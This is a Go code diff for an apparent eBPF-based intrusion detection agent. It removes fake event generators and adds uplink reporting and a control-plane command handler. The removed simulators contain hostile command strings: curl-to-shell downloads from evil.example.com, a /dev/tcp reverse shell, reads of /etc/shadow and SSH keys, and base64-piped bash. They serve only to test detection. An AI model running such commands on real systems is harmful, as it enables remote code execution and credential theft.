-		Binary:    binary,
-		Arguments: args,
-	}
-}
-
-func fakeFileArg(path string) *tetragon.KprobeArgument {
-	return &tetragon.KprobeArgument{
-		Arg: &tetragon.KprobeArgument_FileArg{FileArg: &tetragon.KprobeFile{Path: path}},
-	}
-}
-
-func fakeIntArg(v int32) *tetragon.KprobeArgument {
-	return &tetragon.KprobeArgument{
-		Arg: &tetragon.KprobeArgument_IntArg{IntArg: v},
-	}
-}
-
-func fakeWebshell(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
-	parent := fmt.Sprintf("fake-bash-%d", seq)
-	child := fmt.Sprintf("fake-curl-%d", seq)
-	handleExec(&tetragon.ProcessExec{
-		Process: fakeProcess(parent, 1000, 1000, "/bin/bash", "-c 'curl evil.example.com | sh'"),
-	}, st, pt, broadcast)
-	handleExec(&tetragon.ProcessExec{
-		Process: fakeProcess(child, 1001, 1000, "/usr/bin/curl", "-fsSL https://evil.example.com/payload.sh | sh"),
-		Parent:  fakeProcess(parent, 1000, 1000, "/bin/bash", ""),
-	}, st, pt, broadcast)
-	handleKprobe(&tetragon.ProcessKprobe{
-		Process:    fakeProcess(child, 1001, 0, "/usr/bin/curl", ""),
-		PolicyName: "sensitive-file-access",
-		Args:       []*tetragon.KprobeArgument{fakeFileArg("/etc/shadow"), fakeIntArg(4)},
-	}, st, pt, broadcast)
-}
-
-func fakeReverseShell(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
-	bashID := fmt.Sprintf("fake-rsh-bash-%d", seq)
-	handleExec(&tetragon.ProcessExec{
-		Process: fakeProcess(bashID, 2000, 1000, "/bin/bash", "-c 'exec 3<>/dev/tcp/127.0.0.1/4444'"),
-	}, st, pt, broadcast)
-	handleKprobe(&tetragon.ProcessKprobe{
-		Process:    fakeProcess(bashID, 2000, 1000, "/bin/bash", ""),
-		PolicyName: "outbound-connections",
-		Args:       []*tetragon.KprobeArgument{},
-	}, st, pt, broadcast)
-}
-
-func fakeCredentialTheft(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
-	bashID := fmt.Sprintf("fake-cred-bash-%d", seq)
-	handleExec(&tetragon.ProcessExec{
-		Process: fakeProcess(bashID, 3000, 0, "/bin/bash", "-c 'cat /etc/shadow'"),
-	}, st, pt, broadcast)
-	for _, target := range []string{"/etc/shadow", "/etc/sudoers", "/root/.ssh/id_rsa"} {
-		handleKprobe(&tetragon.ProcessKprobe{
-			Process:    fakeProcess(bashID, 3000, 0, "/bin/bash", ""),
-			PolicyName: "sensitive-file-access",
-			Args:       []*tetragon.KprobeArgument{fakeFileArg(target), fakeIntArg(4)},
-		}, st, pt, broadcast)
-	}
-}
-
-func fakePrivEsc(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
-	bashID := fmt.Sprintf("fake-priv-bash-%d", seq)
-	sudoID := fmt.Sprintf("fake-priv-sudo-%d", seq)
-	handleExec(&tetragon.ProcessExec{
-		Process: fakeProcess(bashID, 4000, 1000, "/bin/bash", ""),
-	}, st, pt, broadcast)
-	handleExec(&tetragon.ProcessExec{
-		Process: fakeProcess(sudoID, 4001, 1000, "/usr/bin/sudo", "-i"),
-		Parent:  fakeProcess(bashID, 4000, 1000, "/bin/bash", ""),
-	}, st, pt, broadcast)
-	handleKprobe(&tetragon.ProcessKprobe{
-		Process:    fakeProcess(sudoID, 4001, 0, "/usr/bin/sudo", ""),
-		PolicyName: "privilege-escalation",
-		Args:       []*tetragon.KprobeArgument{fakeIntArg(0)},
-	}, st, pt, broadcast)
-}
-
-func fakeLOLBin(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
-	id := fmt.Sprintf("fake-lol-bash-%d", seq)
-	handleExec(&tetragon.ProcessExec{
-		Process: fakeProcess(id, 5000, 1000, "/bin/bash", "-c 'echo aGVsbG8K | base64 -d | bash'"),
-	}, st, pt, broadcast)
-}
+// ---------------------------------------------------------------------------
+// Event handlers — the sensing path.
+//
+// Duplicated verbatim (in behaviour) from cmd/engine. See the STRANGLER NOTE
+// at the top of this file: sharing this glue means extracting it into a common
+// package, which is the Phase 1 "hollow out cmd/engine" step. Keeping it here
+// now lets the live cmd/engine path stay frozen while the agent build target
+// links against the same scoring/tree/store/gateway core.
+// ---------------------------------------------------------------------------
 
 func handleEvent(resp *tetragon.GetEventsResponse, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
 	switch ev := resp.Event.(type) {
@@ -797,11 +790,8 @@ func handleEvent(resp *tetragon.GetEventsResponse, st *store.Store, pt *tree.Tre
 }
 
 // handleExit forwards a slim process_exit notification onto the SSE stream so
-// the UI can react immediately when a process dies. The payload carries just
-// the identifying fields the client needs to locate the node — no event-store
-// insert (we deliberately keep the 500-event ring buffer tied to telemetry,
-// not lifecycle). The correlation-graph modal listens for this and drops the
-// node when it's in Live mode.
+// the local console can drop the node when it dies. No event-store insert —
+// the ring buffer is deliberately tied to telemetry, not lifecycle.
 func handleExit(ev *tetragon.ProcessExit, broadcast chan<- api.Broadcast) {
 	if ev == nil || ev.Process == nil {
 		return
@@ -861,6 +851,7 @@ func handleExec(ev *tetragon.ProcessExec, st *store.Store, pt *tree.Tree, broadc
 	}
 	e.ID = id
 
+	enqueueUplink(uplink.EventRecord(e))
 	metrics.IncEvent("process_exec")
 	send(broadcast, api.Broadcast{Type: "event", Payload: e})
 	checkAlert(p.ExecId, st, pt, broadcast, reason)
@@ -897,6 +888,7 @@ func handleKprobe(ev *tetragon.ProcessKprobe, st *store.Store, pt *tree.Tree, br
 	}
 	e.ID = id
 
+	enqueueUplink(uplink.EventRecord(e))
 	metrics.IncEvent("process_kprobe")
 	send(broadcast, api.Broadcast{Type: "event", Payload: e})
 	checkAlert(p.ExecId, st, pt, broadcast, reason)
@@ -931,10 +923,9 @@ func extractKprobeArgs(args []*tetragon.KprobeArgument) string {
 func checkAlert(execID string, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast, reason string) {
 	chainScore := pt.ChainScore(execID)
 
-	// Gateway runs on every event regardless of alert threshold so a
-	// process can transition to "throttled" before it ever produces an
-	// alert. The gateway is monotonic — repeated calls below threshold
-	// are no-ops.
+	// Gateway runs on every event regardless of alert threshold so a process
+	// can transition to "throttled" before it ever produces an alert. The
+	// gateway is monotonic — repeated calls below threshold are no-ops.
 	dispatchGateway(execID, pt, chainScore, reason)
 
 	if chainScore < 10 {
@@ -961,15 +952,15 @@ func checkAlert(execID string, st *store.Store, pt *tree.Tree, broadcast chan<- 
 		return
 	}
 	a.ID = id
+	enqueueUplink(uplink.AlertRecord(a))
 	metrics.IncAlert(severity)
 	send(broadcast, api.Broadcast{Type: "alert", Payload: a})
 	log.Printf("[ALERT %s] %s", severity, title)
 }
 
-// dispatchGateway calls the choke gateway with the latest chain score for
-// an exec_id. Looks up the node in the process tree to get the canonical
-// PID/binary so the enforcer has a real target. nil-safe: if the gateway
-// isn't initialised (early init or tests) this is a no-op.
+// dispatchGateway calls the choke gateway with the latest chain score for an
+// exec_id. Looks up the node in the process tree to get the canonical
+// PID/binary so the enforcer has a real target. nil-safe.
 func dispatchGateway(execID string, pt *tree.Tree, chainScore int, reason string) {
 	if gw == nil {
 		return
@@ -995,8 +986,8 @@ func send(ch chan<- api.Broadcast, b api.Broadcast) {
 	}
 }
 
-// splitCSV splits a comma-separated flag value into trimmed, non-empty
-// fields. Used for -devchoke-iface and -devchoke-protect.
+// splitCSV splits a comma-separated flag value into trimmed, non-empty fields.
+// Used for -devchoke-iface and -devchoke-protect.
 func splitCSV(s string) []string {
 	var out []string
 	for _, p := range strings.Split(s, ",") {
@@ -1007,8 +998,8 @@ func splitCSV(s string) []string {
 	return out
 }
 
-// redactDSN strips the password from a Postgres DSN before logging it,
-// so journald doesn't permanently capture credentials.
+// redactDSN strips the password from a Postgres DSN before logging it, so
+// journald doesn't permanently capture credentials.
 func redactDSN(dsn string) string {
 	at := strings.LastIndex(dsn, "@")
 	if at < 0 {
@@ -1023,4 +1014,72 @@ func redactDSN(dsn string) string {
 		return dsn
 	}
 	return dsn[:scheme+3+colon+1] + "***" + dsn[at:]
+}
+
+// hostOnly returns the host part of a host:port endpoint, used as the default
+// TLS server name for control-plane cert verification.
+func hostOnly(hostport string) string {
+	if h, _, err := net.SplitHostPort(hostport); err == nil {
+		return h
+	}
+	return hostport
+}
+
+// gatewayMode maps the choke gateway's runtime mode onto the wire enum for
+// heartbeat reporting.
+func gatewayMode(g *choke.Gateway) ebpfsocv1.EnforcementMode {
+	switch g.Mode() {
+	case choke.ModeEnforcing:
+		return ebpfsocv1.EnforcementMode_ENFORCEMENT_MODE_ENFORCING
+	case choke.ModeDryRun:
+		return ebpfsocv1.EnforcementMode_ENFORCEMENT_MODE_DRY_RUN
+	case choke.ModeDetectOnly:
+		return ebpfsocv1.EnforcementMode_ENFORCEMENT_MODE_DETECT_ONLY
+	default:
+		return ebpfsocv1.EnforcementMode_ENFORCEMENT_MODE_UNSPECIFIED
+	}
+}
+
+// gatewayApplier adapts control-plane commands onto the local choke gateway.
+// It implements command.Applier. The command.Processor has already verified the
+// signature and applied the always-protected guardrail before any method here
+// runs, so these are the raw effectors. Actions without a clean, safe gateway
+// mapping in Phase 1 return an error, which the processor reports as REJECTED
+// (honest — never a silent no-op).
+type gatewayApplier struct{ gw *choke.Gateway }
+
+func (a gatewayApplier) SetMode(m ebpfsocv1.EnforcementMode) error {
+	a.gw.SetEnforcing(m == ebpfsocv1.EnforcementMode_ENFORCEMENT_MODE_ENFORCING, "control-plane", "remote SetMode command")
+	return nil
+}
+
+func (a gatewayApplier) KillSwitch(halt bool, _ string) error {
+	a.gw.SetKillSwitch(halt)
+	return nil
+}
+
+func (a gatewayApplier) SetThresholds(throttleAt, tarpitAt, quarantineAt, severAt int32) error {
+	a.gw.SetThresholds(circuit.Config{
+		ThrottleAt:   int(throttleAt),
+		TarpitAt:     int(tarpitAt),
+		QuarantineAt: int(quarantineAt),
+		SeverAt:      int(severAt),
+	})
+	return nil
+}
+
+func (a gatewayApplier) Jail(string, uint32, string) error {
+	return fmt.Errorf("jail: not yet supported via the command channel (Phase 1)")
+}
+
+func (a gatewayApplier) Thaw(string, uint32) error {
+	return fmt.Errorf("thaw: not yet supported via the command channel (Phase 1)")
+}
+
+func (a gatewayApplier) ApplyPreset(name string) error {
+	return fmt.Errorf("preset %q: not yet supported via the command channel (Phase 1)", name)
+}
+
+func (a gatewayApplier) SetProtectedList([]string, []string) error {
+	return fmt.Errorf("protected-list updates: not yet supported via the command channel (Phase 1)")
 }
